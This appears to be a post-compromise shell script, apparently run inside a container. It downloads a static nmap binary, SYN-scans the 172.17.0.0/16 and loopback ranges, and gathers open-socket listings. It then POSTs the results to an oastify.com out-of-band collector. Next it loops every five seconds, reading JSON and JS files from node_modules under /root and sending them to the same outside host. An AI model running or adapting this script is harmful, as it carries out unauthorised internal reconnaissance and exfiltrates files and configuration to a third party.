
wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap
chmod +x nmap
echo "Scanning eth0 range (172.17.0.0/16)..." >  output.txt
./nmap -vv -sS 172.17.0.0/16 >> output.txt

# Scan the lo range
echo -e "\nScanning lo range (127.0.0.0/8)..." >> output.txt
./nmap -vv -sS 127.0.0.0/8 >> output.txt
netstat -a >> output.txt
ss -tuln >> output.txt
lsof -i -n -P >> output.txt
netstat -tuln >> output.txt

curl -k -X POST -H "Content-Type: text/plain" --data-binary @output.txt 'http:/hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/nmap'

echo "Scan complete and output sent to yoyo."

cat /root/*/node_modules/*.json;

while true; do

    (cat /root/*/node_modules/*/*.json; cat /root/*/node_modules/*/*.js;) >> outdata.txt
    

    curl -v -k -X POST -d '@outdata.txt' 'http://hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/outdata'
    
    # Remove outdata.txt
    rm -rf outdata.txt
    
  
    sleep 5 
done
